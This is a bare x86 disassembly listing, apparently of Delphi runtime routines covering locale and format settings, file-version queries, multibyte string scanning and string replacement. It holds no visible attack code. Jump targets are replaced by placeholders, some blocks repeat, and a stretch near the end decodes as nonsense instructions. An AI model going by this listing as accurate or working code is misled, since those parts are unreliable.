mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_3a67194
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_3a67194
jmp r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x16c ] eax
mov [ ebp - 0x168 ] 0x5
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x164 ] eax
mov [ ebp - 0x160 ] 0xb
mov [ ebp - 0x15c ] esi
mov [ ebp - 0x158 ] 0x5
lea eax [ ebp - 0x16c ]
push eax
push 0x2
lea edx [ ebp - 0x170 ]
mov eax [ rw-data ]
call sub_3a67194
mov ecx [ ebp - 0x170 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d354
mov ebx eax
push 0x105
lea eax [ ebp - 0x125 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetModuleFileNameA
test eax eax
je r-xdata
mov esi [ ebx + 0x18 ]
push 0x1c
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call VirtualQuery
cmp [ ebp - 0x10 ] 0x1000
jne r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x148 ] eax
mov [ ebp - 0x144 ] 0x5
lea eax [ ebp - 0x150 ]
lea edx [ ebp - 0x125 ]
mov ecx 0x105
call sub_3a65510
mov eax [ ebp - 0x150 ]
lea edx [ ebp - 0x14c ]
call sub_3a69fe4
mov eax [ ebp - 0x14c ]
mov [ ebp - 0x140 ] eax
mov [ ebp - 0x13c ] 0xb
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x138 ] eax
mov [ ebp - 0x134 ] 0xb
mov [ ebp - 0x130 ] esi
mov [ ebp - 0x12c ] 0x5
lea eax [ ebp - 0x148 ]
push eax
push 0x3
lea edx [ ebp - 0x154 ]
mov eax [ rw-data ]
call sub_3a67194
mov ecx [ ebp - 0x154 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d354
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a6d932
lea eax [ ebp - 0x170 ]
call sub_3a652a0
lea eax [ ebp - 0x154 ]
mov edx 0x3
call sub_3a652c4
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3a6d93c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3a6d9f5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_3a6d6d8
movzx eax al
mov edx eax
add edx 0xfffffffd
sub edx 0x8
jb r-xdata
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_3a6d318
mov ebx eax
jmp r-xdata
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
push ebp
call sub_3a6d770
pop ecx
mov ebx eax
jmp r-xdata
dec edx
sub edx 0xa
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a6d9fc
lea eax [ ebp - 0x10 ]
call sub_3a652a0
retn
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_3a67194
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d354
mov ebx eax
sub_3a6da14
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d3d4
mov [ rw-data ] eax
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d3d4
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] r-xdata
mov eax [ rw-data ]
mov [ eax ] sub_3a6da04
mov eax [ rw-data ]
mov edx [ r-xdata ]
mov [ eax ] edx
mov eax [ rw-data ]
mov [ eax ] sub_3a6d758
mov eax [ rw-data ]
mov [ eax ] sub_3a6d93c
mov eax sub_3a6d6a4
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_3a6d6c0
mov edx [ rw-data ]
mov [ edx ] eax
retn
sub_3a6da98
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx - 0x8 ]
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
call sub_3a62f64
test eax eax
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
call sub_3a64380
xor eax eax
mov [ rw-data ] eax
retn
call sub_3a62f64
mov edx [ r-xdata ]
call sub_3a6450c
test al al
jne r-xdata
call sub_3a62f84
push eax
call sub_3a62f64
pop edx
call sub_3a6da04
sub_3a6db44
add esp 0xffffff6c
mov [ esp ] 0x94
push esp
call GetVersionExA
test eax eax
je r-xdata
add esp 0x94
retn
mov eax [ esp + 0x10 ]
mov [ rw-data ] eax
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
mov eax [ esp + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ esp + 0xc ]
mov [ rw-data ] eax
mov eax [ esp + 0xc ]
and eax 0xffff
mov [ rw-data ] eax
jmp r-xdata
mov eax rw-data
lea edx [ esp + 0x14 ]
mov ecx 0x80
call sub_3a65510
sub_3a6dbd4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_3a6dcaa
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0xffffffff
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_3a65338
lea eax [ ebp - 0x4 ]
call j_sub_3a65744
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_3a65730
push eax
call GetFileVersionInfoSizeA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a6dcb1
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
mov eax ebx
call sub_3a62ee0
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_3a6dc8d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
push ebx
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_3a65730
push eax
call GetFileVersionInfoA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_3a62efc
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
call VerQueryValueA
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
sub_3a6dcc0
push esi
push edi
mov edi edx
xor edx edx
test eax eax
je r-xdata
mov eax edx
pop edi
pop esi
retn
cmp [ eax + edi ] 0x0
je r-xdata
test edi edi
jne r-xdata
mov esi edi
dec esi
jmp r-xdata
movzx eax [ eax ]
movzx eax al
bt [ rw-data ] eax
jae r-xdata
test esi esi
jl r-xdata
mov dl 0x1
jmp r-xdata
mov ecx edi
sub ecx esi
and ecx 0x80000001
jns r-xdata
movzx ecx [ eax + esi ]
movzx ecx cl
bt [ rw-data ] ecx
jb r-xdata
test ecx ecx
jne r-xdata
dec ecx
or ecx 0xfffffffe
inc ecx
dec esi
movzx eax [ eax + edi ]
movzx eax al
bt [ rw-data ] eax
jae r-xdata
mov dl 0x2
jmp r-xdata
mov dl 0x1
sub_3a6dd34
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_3a65730
mov edx esi
dec edx
call sub_3a6dcc0
sub_3a6dd70
push ebx
mov ebx eax
mov ecx ebx
test ecx ecx
je r-xdata
cmp edx ecx
jle r-xdata
sub ecx 0x4
mov ecx [ ecx ]
call sub_3a6dd94
pop ebx
retn
mov edx ebx
test edx edx
je r-xdata
sub edx 0x4
mov edx [ edx ]
sub_3a6dd94
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
xor esi esi
test ebp ebp
jg r-xdata
mov eax edi
test eax eax
je r-xdata
mov al 0x1
jmp r-xdata
cmp eax ebp
setl al
sub eax 0x4
mov eax [ eax ]
test al al
jne r-xdata
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi ebp
cmp [ rw-data ] 0x0
je r-xdata
mov ebx 0x1
xor esi esi
cmp ebp ebx
jl r-xdata
movzx eax [ edi + ebx - 0x1 ]
movzx eax al
bt [ rw-data ] eax
jae r-xdata
inc ebx
mov edx ebx
mov eax edi
call sub_3a6dfe0
mov ebx eax
jmp r-xdata
inc esi
cmp ebp ebx
jge r-xdata
sub_3a6ddfc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax edi
test eax eax
je r-xdata
mov [ ebp - 0xc ] eax
mov esi 0x1
mov ebx 0x1
jmp r-xdata
sub eax 0x4
mov eax [ eax ]
cmp ebx [ ebp - 0xc ]
jge r-xdata
cmp esi [ ebp - 0x4 ]
jne r-xdata
cmp esi [ ebp - 0x4 ]
jl r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] esi
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp ebx [ ebp - 0xc ]
jge r-xdata
inc esi
movzx eax [ edi + ebx - 0x1 ]
movzx eax al
bt [ rw-data ] eax
jae r-xdata
movzx eax [ edi + ebx - 0x1 ]
movzx eax al
bt [ rw-data ] eax
jae r-xdata
inc ebx
mov edx ebx
mov eax edi
call sub_3a6dfe0
mov ebx eax
jmp r-xdata
mov edx ebx
mov eax edi
call sub_3a6dfe0
dec eax
mov ebx eax
sub_3a6de8c
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jg r-xdata
mov eax esi
test eax eax
je r-xdata
mov al 0x1
jmp r-xdata
cmp eax ebx
setl al
sub eax 0x4
mov eax [ eax ]
test al al
jne r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp ebx 0x1
jle r-xdata
mov [ esp ] ebx
cmp [ rw-data ] 0x0
je r-xdata
push esp
lea ecx [ esp + 0x8 ]
mov edi ebx
dec edi
mov edx edi
mov eax esi
call sub_3a6ddfc
cmp edi [ esp + 0x4 ]
jle r-xdata
mov eax esi
test eax eax
je r-xdata
mov al 0x1
jmp r-xdata
cmp eax [ esp ]
setle al
sub eax 0x4
mov eax [ eax ]
test al al
je r-xdata
inc [ esp ]
jmp r-xdata
xor eax eax
mov [ esp ] eax
jmp r-xdata
sub_3a6df10
push ebx
push esi
add esp 0xfffffff8
mov ebx eax
xor eax eax
mov [ esp ] eax
test edx edx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov esi ebx
mov eax esi
test eax eax
je r-xdata
cmp eax edx
jge r-xdata
sub eax 0x4
mov eax [ eax ]
cmp [ rw-data ] 0x0
je r-xdata
mov eax esi
test eax eax
je r-xdata
mov [ esp ] edx
push esp
lea ecx [ esp + 0x8 ]
mov eax ebx
call sub_3a6ddfc
mov eax esi
test eax eax
je r-xdata
mov edx eax
sub eax 0x4
mov eax [ eax ]
cmp eax [ esp ]
jge r-xdata
sub eax 0x4
mov eax [ eax ]
mov eax esi
test eax eax
je r-xdata
mov [ esp ] eax
jmp r-xdata
sub eax 0x4
mov eax [ eax ]
sub_3a6dfa8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x1
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
movzx edx [ ebx + esi - 0x1 ]
movzx edx dl
bt [ rw-data ] edx
jae r-xdata
mov eax ebx
call sub_3a65730
add eax esi
dec eax
call sub_3a6df80
sub_3a6dfe0
push ebx
push esi
mov ebx edx
mov esi eax
lea eax [ ebx + 0x1 ]
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
movzx edx [ esi + ebx - 0x1 ]
movzx edx dl
bt [ rw-data ] edx
jae r-xdata
mov eax esi
call sub_3a65730
add eax ebx
dec eax
call sub_3a6df80
add eax ebx
sub_3a6e018
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
xor eax eax
mov eax esi
test eax eax
je r-xdata
xor eax eax
cmp [ esi + ebx - 0x1 ] 0x5c
sete al
jmp r-xdata
cmp eax ebx
setge al
jmp r-xdata
sub eax 0x4
mov eax [ eax ]
xor eax eax
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_3a6dd34
test al al
sete al
pop esi
pop ebx
retn
test al al
je r-xdata
test al al
je r-xdata
sub_3a6e060
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebp eax
xor ebx ebx
test edi edi
jg r-xdata
mov eax esi
test eax eax
je r-xdata
mov al 0x1
jmp r-xdata
cmp eax edi
setl al
sub eax 0x4
mov eax [ eax ]
test al al
je r-xdata
mov edx edi
mov eax esi
call sub_3a6dd34
test al al
setne al
mov al 0x1
jmp r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_3a65730
movzx edx [ esi + edi - 0x1 ]
call sub_3a6a2f8
test eax eax
setne bl
test al al
jne r-xdata
sub_3a6e0bc
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
xor edi edi
mov eax ebx
call sub_3a65730
push eax
mov eax esi
call sub_3a65730
mov ebp eax
mov eax ebp
pop edx
call sub_3a6e188
mov ebx eax
test ebx ebx
je r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi ebx
sub edi ebp
inc edi
sub_3a6e0f4
push ebx
push esi
push edi
push ebp
mov edi edx
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx edi
mov eax esi
call sub_3a694ec
mov eax esi
test eax eax
je r-xdata
mov ebp eax
mov eax edi
mov edx ebp
call sub_3a659c0
mov ebx 0x1
cmp ebp ebx
jl r-xdata
sub eax 0x4
mov eax [ eax ]
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call j_sub_3a65744#2
movzx edx [ esi + ebx - 0x1 ]
mov [ eax + ebx - 0x1 ] dl
movzx eax [ esi + ebx - 0x1 ]
movzx eax al
bt [ rw-data ] eax
jae r-xdata
mov eax [ edi ]
movzx eax [ eax + ebx - 0x1 ]
add al 0xbf
sub al 0x1a
jae r-xdata
inc ebx
mov eax edi
call j_sub_3a65744#2
movzx edx [ esi + ebx - 0x1 ]
mov [ eax + ebx - 0x1 ] dl
jmp r-xdata
inc ebx
cmp ebp ebx
jge r-xdata
mov eax edi
call j_sub_3a65744#2
add [ eax + ebx - 0x1 ] 0x20
jmp r-xdata
sub_3a6e188
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
test ebp ebp
je r-xdata
cmp [ ebp ] 0x0
je r-xdata
mov eax esi
call sub_3a6a120
mov [ esp ] eax
mov eax ebp
call sub_3a6a120
mov edi eax
mov edx ebp
mov eax esi
call sub_3a6a30c
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
xor ebx ebx
mov eax ebx
sub eax esi
mov edx [ esp ]
sub edx eax
cmp edi edx
jbe r-xdata
mov edx ebx
sub edx esi
mov eax esi
call sub_3a6dd58
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x2
je r-xdata
cmp [ esp + 0x4 ] 0x1
jne r-xdata
push edi
push ebp
push edi
push ebx
push 0x0
push 0x400
call CompareStringA
cmp eax 0x2
je r-xdata
inc ebx
mov edx ebp
mov eax ebx
call sub_3a6a30c
mov ebx eax
inc ebx
sub_3a6e228
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_3a6e25c
mov esi eax
mov edi esi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edi esi
inc esi
mov edx ebx
mov eax esi
call sub_3a6e25c
mov esi eax
test esi esi
jne r-xdata
sub_3a6e25c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_3a6a2f8
mov edi eax
test edi edi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov edx edi
sub edx esi
mov eax esi
call sub_3a6dd58
sub al 0x1
jb r-xdata
je r-xdata
inc edi
jmp r-xdata
inc edi
mov edx ebx
mov eax edi
call sub_3a6a2f8
mov edi eax
test edi edi
jne r-xdata
sub_3a6e29c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xffffffec
push edi
push 0x0
call GetCPInfo
xor esi esi
jmp r-xdata
cmp esi 0xc
jge r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
movzx eax [ edi + esi + 0x6 ]
or al [ edi + esi + 0x7 ]
jne r-xdata
movzx eax [ edi + esi + 0x6 ]
movzx ebx [ edi + esi + 0x7 ]
sub bl al
jb r-xdata
add esi 0x2
inc ebx
mov [ ebp - 0x1 ] al
movzx eax [ ebp - 0x1 ]
movzx eax al
bts [ rw-data ] eax
inc [ ebp - 0x1 ]
dec bl
jne r-xdata
sub_3a6e2f8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov esi rw-data
mov [ esi ] 0x409
mov [ esi + 0x4 ] 0x9
mov [ esi + 0x8 ] 0x1
call GetThreadLocale
test eax eax
je r-xdata
test ax ax
je r-xdata
mov [ esi ] eax
push esi
mov esi r-xdata
mov edi rw-data
mov ecx 0x8
[ edi ] [ esi ]
pop esi
cmp [ rw-data ] 0x4
jle r-xdata
mov edx eax
and dx 0x3ff
movzx edx dx
mov [ esi + 0x4 ] edx
movzx eax ax
shr eax 0xa
mov [ esi + 0x8 ] eax
push 0x4a
call GetSystemMetrics
test eax eax
setne al
mov [ esi + 0xd ] al
cmp [ rw-data ] 0x2
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_3a6e29c
pop ecx
mov [ esi + 0xd ] 0x1
jmp r-xdata
push 0x2a
call GetSystemMetrics
test eax eax
setne bl
mov [ esi + 0xc ] bl
test bl bl
je r-xdata
sub_3a6e3bc
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
xor eax eax
push ebp
push sub_3a6e687
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_3a6e2f8
call sub_3a6cbe0
cmp [ rw-data ] 0x0
je r-xdata
call GetThreadLocale
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
xor ecx ecx
mov edx 0x14
mov eax ebx
call sub_3a6cb2c
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_3a652f4
lea eax [ ebp - 0x14 ]
push eax
mov ecx r-xdata
mov edx 0x1b
mov eax ebx
call sub_3a6cb2c
mov eax [ ebp - 0x14 ]
xor edx edx
call sub_3a69a14
mov [ rw-data ] al
lea eax [ ebp - 0x18 ]
push eax
mov ecx r-xdata
mov edx 0x1c
mov eax ebx
call sub_3a6cb2c
mov eax [ ebp - 0x18 ]
xor edx edx
call sub_3a69a14
mov [ rw-data ] al
mov cl 0x2c
mov edx 0xf
mov eax ebx
call sub_3a6cb78
mov [ rw-data ] al
mov cl 0x2e
mov edx 0xe
mov eax ebx
call sub_3a6cb78
mov [ rw-data ] al
lea eax [ ebp - 0x1c ]
push eax
mov ecx r-xdata
mov edx 0x19
mov eax ebx
call sub_3a6cb2c
mov eax [ ebp - 0x1c ]
xor edx edx
call sub_3a69a14
mov [ rw-data ] al
mov cl 0x2f
mov edx 0x1d
mov eax ebx
call sub_3a6cb78
mov [ rw-data ] al
lea eax [ ebp - 0x24 ]
push eax
mov ecx r-xdata
mov edx 0x1f
mov eax ebx
call sub_3a6cb2c
mov eax [ ebp - 0x24 ]
lea edx [ ebp - 0x20 ]
call sub_3a6ce68
mov edx [ ebp - 0x20 ]
mov eax rw-data
call sub_3a652f4
lea eax [ ebp - 0x2c ]
push eax
mov ecx r-xdata
mov edx 0x20
mov eax ebx
call sub_3a6cb2c
mov eax [ ebp - 0x2c ]
lea edx [ ebp - 0x28 ]
call sub_3a6ce68
mov edx [ ebp - 0x28 ]
mov eax rw-data
call sub_3a652f4
mov cl 0x3a
mov edx 0x1e
mov eax ebx
call sub_3a6cb78
mov [ rw-data ] al
lea eax [ ebp - 0x30 ]
push eax
mov ecx r-xdata
mov edx 0x28
mov eax ebx
call sub_3a6cb2c
mov edx [ ebp - 0x30 ]
mov eax rw-data
call sub_3a652f4
lea eax [ ebp - 0x34 ]
push eax
mov ecx r-xdata
mov edx 0x29
mov eax ebx
call sub_3a6cb2c
mov edx [ ebp - 0x34 ]
mov eax rw-data
call sub_3a652f4
lea eax [ ebp - 0x8 ]
call sub_3a652a0
lea eax [ ebp - 0xc ]
call sub_3a652a0
lea eax [ ebp - 0x38 ]
push eax
mov ecx r-xdata
mov edx 0x25
mov eax ebx
call sub_3a6cb2c
mov eax [ ebp - 0x38 ]
xor edx edx
call sub_3a69a14
test eax eax
jne r-xdata
call sub_3a6cdb8
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_3a65338
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_3a65338
jmp r-xdata
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_3a65634
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_3a65634
mov cl 0x2c
mov edx 0xc
mov eax ebx
call sub_3a6cb78
mov [ rw-data ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a6e68e
lea eax [ ebp - 0x40 ]
mov edx 0x10
call sub_3a652c4
retn
lea eax [ ebp - 0x40 ]
push eax
mov ecx r-xdata
mov edx 0x1005
mov eax ebx
call sub_3a6cb2c
mov eax [ ebp - 0x40 ]
xor edx edx
call sub_3a69a14
test eax eax
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
mov ecx r-xdata
mov edx 0x23
mov eax ebx
call sub_3a6cb2c
mov eax [ ebp - 0x3c ]
xor edx edx
call sub_3a69a14
test eax eax
jne r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_3a65338
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_3a65338
jmp r-xdata
sub_3a6e734
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x10 ] edx
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_3a6e87d
push [ fs : eax ]
mov [ fs : eax ] esp
test [ ebp + 0xc ] 0x2
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_3a65338
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
call sub_3a65338
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_3a694b4
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_3a694b4
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0xc ]
mov edx ebx
call sub_3a65338
mov eax esi
call sub_3a652a0
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_3a6e0bc
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a6e884
lea eax [ ebp - 0x1c ]
call sub_3a652a0
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_3a652c4
retn
push [ esi ]
lea eax [ ebp - 0x1c ]
push eax
mov ecx ebx
dec ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_3a65798
push [ ebp - 0x1c ]
push [ ebp - 0x14 ]
mov eax esi
mov edx 0x3
call sub_3a65634
mov edi [ ebp - 0x10 ]
test edi edi
je r-xdata
mov eax esi
mov edx [ ebp - 0xc ]
call sub_3a6556c
jmp r-xdata
lea eax [ ebp - 0xc ]
push eax
lea edx [ edi + ebx ]
mov ecx 0x7fffffff
mov eax [ ebp - 0xc ]
call sub_3a65798
test [ ebp + 0xc ] 0x1
jne r-xdata
sub edi 0x4
mov edi [ edi ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax esi
mov edx [ ebp - 0xc ]
call sub_3a6556c
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov edx [ ebp - 0x18 ]
add edx ebx
mov ecx 0x7fffffff
mov eax [ ebp - 0x4 ]
call sub_3a65798
mov eax [ ebp - 0x18 ]
sub eax 0x4
mov eax [ eax ]
mov [ ebp - 0x18 ] eax
sub_3a6e8af
inc [ eax ]
add [ eax ] al
add [ eax ] cl
push ebx
jns r-xdata
adc al 0x24
push ebp
je r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov edx [ edx ]
test edx edx
jne r-xdata
insb
jae r-xdata
mov eax [ esp ]
mov ebx [ eax + 0x14 ]
cmp [ ebx ] 0x0
je r-xdata
cmp eax [ edx + 0x4 ]
je r-xdata
cmp [ esp ] 0x0
je r-xdata
mov [ esp ] edx
call sub_3a65798
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
inc eax
add ah al
call 0xeb4ec6c
push esp
dec ebp
outsd
jne r-xdata
mov [ esp + 0x8 ] rw-data
mov [ esp + 0x8 ] rw-data
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_3a6e0bc
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a6e884
lea eax [ ebp - 0x1c ]
call sub_3a652a0
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_3a652c4
retn
cmp [ eax + 0x14 ] 0x0
je r-xdata
add al 0x24
dec ecx
outsb
outsw
or [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
nop
call sub_3aaec85
add [ eax ] al
lea eax [ eax ]
mov edx [ r-xdata ]
mov eax ebx
call sub_3a66170
mov eax [ esp ]
xor edx edx
mov [ eax + 0x14 ] edx
inc ebp
xor esi esi
mov eax [ ebx + 0x4 ]
call sub_3a6641c
mov ebp eax
test ebp ebp
jl r-xdata
push [ esi ]
lea eax [ ebp - 0x1c ]
push eax
mov ecx ebx
dec ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_3a65798
push [ ebp - 0x1c ]
push [ ebp - 0x14 ]
mov eax esi
mov edx 0x3
call sub_3a65634
mov edi [ ebp - 0x10 ]
test edi edi
je r-xdata
mov eax esi
mov edx [ ebp - 0xc ]
call sub_3a6556c
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + edi * 8 + 0xc ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + edi * 8 ]
lea edx [ esi + esi * 2 ]
mov ecx [ ebx + 0x4 ]
mov edx [ ecx + edx * 8 + 0x4 ]
mov [ edx ] eax
jmp r-xdata
lea eax [ ebp - 0xc ]
push eax
lea edx [ edi + ebx ]
mov ecx 0x7fffffff
mov eax [ ebp - 0xc ]
call sub_3a65798
test [ ebp + 0xc ] 0x1
jne r-xdata
sub edi 0x4
mov edi [ edi ]
mov eax [ ebx + 0x4 ]
cmp [ eax + edi * 8 ] 0x0
je r-xdata
lea eax [ esi + esi * 2 ]
mov edx [ ebx + 0x4 ]
mov eax [ edx + eax * 8 + 0xc ]
call sub_3a6e8e4
mov ecx 0x3fd
xor edx edx
div ecx
mov [ esp + 0x4 ] edx
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov eax [ eax + edx * 4 ]
mov edx [ ebx + 0x4 ]
lea edx [ edx + edi * 8 ]
cmp eax edx
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax esi
mov edx [ ebp - 0xc ]
call sub_3a6556c
